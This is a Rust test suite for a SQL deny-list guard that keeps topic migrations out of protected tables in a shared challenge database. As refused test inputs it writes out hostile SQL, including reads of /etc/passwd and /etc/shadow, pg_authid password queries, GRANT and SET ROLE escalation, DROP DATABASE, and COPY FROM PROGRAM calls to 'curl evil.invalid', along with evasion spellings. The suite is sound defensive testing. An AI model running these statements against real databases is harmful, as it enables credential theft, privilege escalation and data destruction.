//! The migration deny-list: what a topic's SQL may and may not do.
//!
//! These are the tests that matter most in this crate. A topic migration runs
//! in the **shared challenge database**, so a miss here is not a bug in one
//! topic — it is a path to rewriting another topic's rules, forging a
//! promotion, or dropping the tables the whole subnet's scoring reads.
//!
//! The suite is deliberately adversarial: it tries the spellings an attacker
//! would reach for (quoting, comments, dollar-quoted bodies, case, schema
//! qualification, `IF EXISTS`), and it asserts the *happy* path too, because
//! a guard that refuses everything is not a guard — it is an outage.

#![allow(clippy::unwrap_used, clippy::expect_used)]

use proof_topic_install::sql_guard::{
    blank_statements, check_migration, is_topic_scoped, split_statements, OWNED_TABLES,
};
use proof_topic_install::InstallError;

const TOPIC: &str = "tb4";

/// Assert a migration is refused, naming `needle` in the refusal.
fn refused(sql: &str, needle: &str) {
    let err = check_migration(sql, TOPIC).expect_err(&format!("must refuse: {sql}"));
    let InstallError::MigrationDenied { what, why, .. } = &err else {
        panic!("expected MigrationDenied for {sql:?}, got {err:?}");
    };
    let text = format!("{what} {why}");
    assert!(
        text.to_lowercase().contains(&needle.to_lowercase()),
        "{sql:?}: refusal must name {needle:?}, said {text:?}"
    );
}

/// Assert a migration is allowed.
fn allowed(sql: &str) {
    check_migration(sql, TOPIC).unwrap_or_else(|e| panic!("must allow {sql:?}: {e}"));
}

// ---------------------------------------------------------------------------
// The deny-list: every proof_* object is out of bounds
// ---------------------------------------------------------------------------

/// Every table this repository owns is refused by name, whatever the verb.
///
/// The enforcement is the `proof_` **prefix**, so a table a later migration
/// adds is protected without editing the guard. This test asserts the
/// readable list stays in step with the migrations, so a refusal can name the
/// object it refused.
#[test]
fn no_topic_migration_may_touch_a_proof_table() {
    for table in OWNED_TABLES {
        for sql in [
            format!("DROP TABLE {table}"),
            format!("ALTER TABLE {table} ADD COLUMN evil TEXT"),
            format!("TRUNCATE {table}"),
            format!("INSERT INTO {table} (topic_id) VALUES ('x')"),
            format!("UPDATE {table} SET topic_id = 'x'"),
            format!("DELETE FROM {table}"),
            format!("SELECT * FROM {table}"),
            format!("CREATE TABLE {table} (id TEXT)"),
            format!("CREATE INDEX ON {table} (topic_id)"),
        ] {
            let err = check_migration(&sql, TOPIC).expect_err(&format!("{sql:?} must be refused"));
            let InstallError::MigrationDenied { what, why, .. } = &err else {
                panic!("{sql:?}: expected MigrationDenied, got {err:?}");
            };
            assert!(
                what.to_lowercase().contains(&table.to_lowercase())
                    || why.to_lowercase().contains("proof_"),
                "{sql:?}: refusal must name the object, said what={what:?} why={why:?}"
            );
        }
    }
}

/// A `proof_*` table that does not exist yet is still refused: the guard is
/// the prefix, not a list that a later migration could fall behind.
#[test]
fn an_unlisted_proof_table_is_still_refused() {
    for sql in [
        "SELECT * FROM proof_something_added_later",
        "DROP TABLE proof_future_table",
        "INSERT INTO proof_future_table (a) VALUES (1)",
        "ALTER TABLE proof_future_table ADD COLUMN b TEXT",
    ] {
        refused(sql, "proof_");
    }
}

/// The sqlx bookkeeping table and the roles are out of bounds too: a topic
/// that could rewrite `_sqlx_migrations` could make the next boot skip a
/// migration, and a topic that could `GRANT` could escalate.
#[test]
fn the_shared_databases_own_objects_are_refused() {
    for (sql, needle) in [
        ("DELETE FROM _sqlx_migrations", "_sqlx_migrations"),
        (
            "INSERT INTO _sqlx_migrations (version) VALUES (1)",
            "_sqlx_migrations",
        ),
        ("SELECT * FROM pg_roles", "pg_roles"),
        ("SELECT rolpassword FROM pg_authid", "pg_authid"),
        ("SELECT * FROM pg_catalog.pg_proc", "pg_catalog"),
        (
            "SELECT * FROM information_schema.tables",
            "information_schema",
        ),
    ] {
        refused(sql, needle);
    }
}

// ---------------------------------------------------------------------------
// Privilege escalation, escape, and destruction
// ---------------------------------------------------------------------------

/// Privilege and session control are refused: a topic migration is data
/// definition inside its own namespace, not administration.
#[test]
fn privilege_and_session_control_are_refused() {
    for sql in [
        "GRANT ALL ON SCHEMA public TO base_app",
        "GRANT SELECT ON tb4_scratch TO base_app",
        "REVOKE SELECT ON tb4_scratch FROM base_app",
        "SET ROLE base_app",
        "SET search_path TO public",
        "RESET ALL",
        "BEGIN",
        "COMMIT",
        "DISCARD ALL",
        "LISTEN channel",
        "NOTIFY channel",
    ] {
        let err = check_migration(sql, TOPIC).expect_err(sql);
        assert!(
            matches!(err, InstallError::MigrationDenied { .. }),
            "{sql}: {err:?}"
        );
    }
}

/// Dropping the database, a schema, a role, or an extension is refused, and
/// the refusal names the kind.
#[test]
fn dropping_shared_infrastructure_is_refused() {
    for (sql, needle) in [
        ("DROP DATABASE base", "DROP DATABASE"),
        ("DROP SCHEMA public CASCADE", "DROP SCHEMA"),
        ("DROP ROLE base_app", "DROP ROLE"),
        ("DROP OWNED BY base_app", "DROP OWNED"),
        ("DROP EXTENSION plpgsql", "DROP EXTENSION"),
        ("DROP TABLESPACE fast", "DROP TABLESPACE"),
    ] {
        refused(sql, needle);
    }
}

/// Server-side file access is refused: the database host's filesystem is not
/// a topic's to read.
#[test]
fn server_side_file_access_is_refused() {
    for (sql, needle) in [
        ("SELECT pg_read_file('/etc/passwd')", "pg_read_file"),
        (
            "SELECT pg_read_binary_file('/etc/shadow')",
            "pg_read_binary_file",
        ),
        ("SELECT pg_write_file('/tmp/x', 'y')", "pg_write_file"),
        ("SELECT pg_ls_dir('/root')", "pg_ls_dir"),
        ("SELECT lo_import('/etc/passwd')", "lo_import"),
        ("SELECT lo_export(1, '/tmp/x')", "lo_export"),
        (
            "SELECT pg_execute_server_program('curl evil.invalid')",
            "pg_execute_server_program",
        ),
    ] {
        refused(sql, needle);
    }
}

/// `COPY … PROGRAM` and `COPY … FROM` are both refused: one runs a shell
/// command, the other reads a host file.
#[test]
fn copy_is_refused_in_every_direction() {
    for sql in [
        "COPY tb4_scratch FROM '/etc/passwd'",
        "COPY tb4_scratch TO '/tmp/out'",
        "COPY tb4_scratch FROM PROGRAM 'curl evil.invalid'",
    ] {
        refused(sql, "COPY");
    }
}

/// A `SECURITY DEFINER` function runs as its owner, which is the migration
/// role. Refused.
#[test]
fn a_security_definer_function_is_refused() {
    for sql in [
        "CREATE FUNCTION tb4_f() RETURNS int AS $$ SELECT 1 $$ LANGUAGE sql SECURITY DEFINER",
        "CREATE FUNCTION tb4_f() RETURNS int SECURITY DEFINER AS 'SELECT 1' LANGUAGE sql",
    ] {
        refused(sql, "SECURITY");
    }
}

/// Maintenance verbs are refused: they take locks the scoring path does not
/// expect and can be used to stall a live challenge.
#[test]
fn maintenance_verbs_are_refused() {
    for sql in [
        "VACUUM tb4_scratch",
        "VACUUM FULL tb4_scratch",
        "CLUSTER tb4_scratch USING tb4_idx",
        "REINDEX TABLE tb4_scratch",
    ] {
        let err = check_migration(sql, TOPIC).expect_err(sql);
        assert!(
            matches!(err, InstallError::MigrationDenied { .. }),
            "{sql}: {err:?}"
        );
    }
}

// ---------------------------------------------------------------------------
// Namespace: a topic may only touch its own objects
// ---------------------------------------------------------------------------

/// A topic may not create, write, or read another topic's — or a shared —
/// object. This is what keeps one topic's install from colliding with the
/// next one's, or from reading a sibling's rows.
#[test]
fn a_topic_may_only_touch_its_own_namespace() {
    for sql in [
        "CREATE TABLE other_topic_scores (id TEXT)",
        "CREATE TABLE scores (id TEXT)",
        "CREATE TABLE miners (id TEXT)",
        "CREATE TABLE challenge_backends (id TEXT)",
        "CREATE TABLE public_scores (id TEXT)",
        "INSERT INTO other_topic_scores (id) VALUES ('x')",
        "UPDATE other_topic_scores SET id = 'x'",
        "DELETE FROM other_topic_scores",
        "SELECT * FROM other_topic_scores",
        "SELECT * FROM miners",
    ] {
        let err = check_migration(sql, TOPIC).expect_err(&format!("{sql:?} must be refused"));
        assert!(
            matches!(err, InstallError::MigrationDenied { .. }),
            "{sql}: {err:?}"
        );
    }
}

/// The topic's own namespace — `tb4_*`, `topic_*`, and `tb4.…` — is allowed,
/// in every verb a migration legitimately needs.
#[test]
fn a_topics_own_namespace_is_allowed() {
    for sql in [
        "CREATE TABLE tb4_scratch (id TEXT)",
        "CREATE TABLE topic_scores (id TEXT, value DOUBLE PRECISION)",
        "CREATE INDEX tb4_scratch_idx ON tb4_scratch (id)",
        "ALTER TABLE tb4_scratch ADD COLUMN note TEXT",
        "INSERT INTO tb4_scratch (id) VALUES ('a')",
        "UPDATE tb4_scratch SET note = 'b' WHERE id = 'a'",
        "DELETE FROM tb4_scratch WHERE id = 'a'",
        "SELECT id FROM tb4_scratch",
        "CREATE TABLE tb4.runs (id TEXT)",
        "CREATE TYPE tb4_state AS ENUM ('open', 'closed')",
        "CREATE SEQUENCE tb4_seq",
        "TRUNCATE tb4_scratch",
        "CREATE VIEW tb4_view AS SELECT id FROM tb4_scratch",
    ] {
        allowed(sql);
    }
    // A sibling topic's namespace is not the topic's, even though it looks
    // similar: the prefix has to match the topic's own id.
    assert!(is_topic_scoped("tb4_scratch", "tb4"));
    assert!(is_topic_scoped("topic_scratch", "tb4"));
    assert!(is_topic_scoped("tb4.runs", "tb4"));
    assert!(!is_topic_scoped("tb40_scratch", "tb4"));
    assert!(!is_topic_scoped("tb_scratch", "tb4"));
    assert!(!is_topic_scoped("", "tb4"));
}

/// A quoted identifier still names an object, so quoting cannot smuggle a
/// denied table past the scanner.
#[test]
fn quoted_identifiers_cannot_smuggle_a_denied_object() {
    for sql in [
        r#"SELECT * FROM "proof_rule_version""#,
        r#"DROP TABLE "proof_topic_version""#,
        r#"INSERT INTO "other_topic_scores" (a) VALUES (1)"#,
        r#"CREATE TABLE "scores" (id TEXT)"#,
    ] {
        let err = check_migration(sql, TOPIC).expect_err(&format!("{sql:?} must be refused"));
        assert!(
            matches!(err, InstallError::MigrationDenied { .. }),
            "{sql}: {err:?}"
        );
    }
}

// ---------------------------------------------------------------------------
// Evasion attempts
// ---------------------------------------------------------------------------

/// A denied word inside a string literal is **data**, not a statement: a
/// migration that stores the text `"DROP DATABASE"` must still install.
#[test]
fn a_denied_word_inside_a_literal_is_not_a_refusal() {
    allowed("INSERT INTO tb4_notes (body) VALUES ('DROP DATABASE base; GRANT ALL')");
    allowed("INSERT INTO tb4_notes (body) VALUES ('proof_topic_version')");
    allowed("CREATE TABLE tb4_notes (body TEXT DEFAULT 'pg_read_file')");
    allowed("INSERT INTO tb4_notes (body) VALUES ('other_topic_scores')");
}

/// A denied statement inside a comment is not a statement either.
#[test]
fn a_denied_statement_inside_a_comment_is_not_a_refusal() {
    allowed("-- DROP DATABASE base\nSELECT 1 FROM tb4_scratch");
    allowed("/* GRANT ALL ON SCHEMA public TO base_app */\nSELECT 1 FROM tb4_scratch");
    allowed("/* nested /* GRANT */ still a comment */ SELECT 1 FROM tb4_scratch");
}

/// Case and whitespace do not evade the scanner.
#[test]
fn case_and_whitespace_do_not_evade_the_guard() {
    for sql in [
        "drop database base",
        "DrOp DaTaBaSe base",
        "DROP\n\tDATABASE\nbase",
        "  DROP   SCHEMA   public  ",
        "grant all on tb4_scratch to base_app",
        "sElEcT * FrOm PrOoF_rUlE_vErSiOn",
    ] {
        let err = check_migration(sql, TOPIC).expect_err(sql);
        assert!(
            matches!(err, InstallError::MigrationDenied { .. }),
            "{sql}: {err:?}"
        );
    }
}

/// A dollar-quoted function body is scanned, not trusted: a denied object
/// inside it is still refused, because the body is what runs.
#[test]
fn a_dollar_quoted_body_is_scanned_not_trusted() {
    refused(
        "CREATE FUNCTION tb4_f() RETURNS void AS $$ DELETE FROM proof_rule_version $$ LANGUAGE sql",
        "proof_",
    );
    refused(
        "CREATE FUNCTION tb4_f() RETURNS void AS $body$ GRANT ALL ON tb4_x TO base_app $body$ LANGUAGE sql",
        "GRANT",
    );
}

/// A multi-statement migration is refused as a whole: the ordinal names the
/// offending statement, and the good statements before it do not save it.
#[test]
fn a_denied_statement_refuses_the_whole_migration_and_names_its_ordinal() {
    let sql = "CREATE TABLE tb4_ok (id TEXT); INSERT INTO tb4_ok (id) VALUES ('a'); \
               DROP TABLE proof_rule_version;";
    let err = check_migration(sql, TOPIC).expect_err("third statement is denied");
    let InstallError::MigrationDenied { ordinal, what, .. } = err else {
        panic!("expected MigrationDenied, got {err:?}");
    };
    assert_eq!(ordinal, 3, "the refusal must name the offending statement");
    assert!(what.contains("proof_"), "{what}");

    // And a migration that is legal end to end is allowed, so the guard is
    // not simply refusing everything with a semicolon in it.
    allowed("CREATE TABLE tb4_a (id TEXT); CREATE TABLE tb4_b (id TEXT);");
}

/// An empty migration installs nothing, which is a bundle mistake rather than
/// a security event — but it is still refused, because a step that does
/// nothing should not be in a bundle.
#[test]
fn an_empty_migration_is_refused() {
    for sql in ["", "   ", "\n\n", "-- only a comment\n", "/* nothing */"] {
        let err = check_migration(sql, TOPIC).expect_err(sql);
        assert!(
            matches!(err, InstallError::MigrationDenied { .. }),
            "{sql:?}: {err:?}"
        );
    }
}

// ---------------------------------------------------------------------------
// The scanner itself
// ---------------------------------------------------------------------------

/// The splitter keeps statement text executable and the blanked copy
/// scannable: literals survive in `text` (or the migration would not work)
/// and are gone from `blanked` (or a literal would be a false refusal).
#[test]
fn the_splitter_keeps_executable_text_and_blanks_for_scanning() {
    let statements = split_statements(
        "CREATE TABLE tb4_a (b TEXT DEFAULT 'DROP DATABASE base'); \
         INSERT INTO tb4_a (b) VALUES ('x;y');",
    );
    assert_eq!(
        statements.len(),
        2,
        "a semicolon inside a literal is not a split"
    );
    assert!(
        statements[0].text.contains("DROP DATABASE base"),
        "the executable text keeps the literal: {}",
        statements[0].text
    );
    assert!(
        !statements[0].blanked.contains("DROP DATABASE"),
        "the scanned copy must not see the literal: {}",
        statements[0].blanked
    );
    assert!(
        statements[1].text.contains("'x;y'"),
        "{}",
        statements[1].text
    );
    assert_eq!(statements[0].ordinal, 1);
    assert_eq!(statements[1].ordinal, 2);

    // A doubled quote is an escaped quote, not the end of the literal.
    let quoted = split_statements("INSERT INTO tb4_a (b) VALUES ('it''s; fine')");
    assert_eq!(quoted.len(), 1);
    assert!(quoted[0].text.contains("it''s; fine"), "{}", quoted[0].text);
}

/// Word matching is on boundaries: a column named `granted` or a table named
/// `proofish` is not a `GRANT` or a `proof_` object.
#[test]
fn word_matching_respects_boundaries() {
    allowed("CREATE TABLE tb4_granted (id TEXT)");
    allowed("INSERT INTO tb4_granted (id) VALUES ('x')");
    allowed("CREATE TABLE tb4_vacuumed (id TEXT)");
    // `proofish` does not carry the `proof_` prefix.
    allowed("CREATE TABLE tb4_proofish (id TEXT)");
    // An actual proof_ object does.
    refused("SELECT * FROM proof_topic_version", "proof_");

    // A name that merely *contains* `proof_` but sits inside the topic's own
    // namespace is the topic's own table, not the repository's: PostgreSQL
    // resolves by exact name, so `tb4_proof_topic_version` cannot shadow
    // `proof_topic_version`. The guard checks the base name's prefix, not a
    // substring, and this is the case that pins that distinction.
    allowed("CREATE TABLE tb4_proof_topic_version (id TEXT)");
    refused("SELECT * FROM proof_topic_version", "proof_topic_version");
}

/// `UPDATE … SET …` is not a session `SET`: the statement-head rule must not
/// produce a false refusal on the most ordinary write there is.
#[test]
fn an_update_set_is_not_a_session_set() {
    allowed("UPDATE tb4_scratch SET note = 'x' WHERE id = 'a'");
    allowed("INSERT INTO tb4_scratch (id) VALUES ('a') ON CONFLICT (id) DO UPDATE SET id = 'b'");
    refused("SET search_path TO evil", "SET");
    refused("SET ROLE base_app", "SET");
}

/// The blanked form is what the guard reads, and it is available to a caller
/// that only wants to scan.
#[test]
fn the_blanked_form_is_available_and_free_of_literals() {
    let blanked = blank_statements("SELECT 'secret literal' FROM tb4_scratch");
    assert_eq!(blanked.len(), 1);
    assert!(!blanked[0].contains("secret"), "{}", blanked[0]);
    assert!(blanked[0].contains("tb4_scratch"), "{}", blanked[0]);
}

/// `CREATE TABLE IF NOT EXISTS` is recognised: the object after the keyword
/// is the name, not `IF`.
#[test]
fn if_not_exists_is_recognised_as_the_same_statement() {
    allowed("CREATE TABLE IF NOT EXISTS tb4_scratch (id TEXT)");
    refused(
        "CREATE TABLE IF NOT EXISTS other_topic_scratch (id TEXT)",
        "other_topic_scratch",
    );
    refused(
        "CREATE TABLE IF NOT EXISTS proof_rule_version (id TEXT)",
        "proof_",
    );
}

/// A table function is not a table: `generate_series(…)` in a `FROM` must not
/// be mistaken for an object outside the topic's namespace.
#[test]
fn a_table_function_is_not_treated_as_a_table() {
    allowed("SELECT g FROM generate_series(1, 10) AS g");
    allowed("INSERT INTO tb4_scratch (id) SELECT g::text FROM generate_series(1, 3) AS g");
}
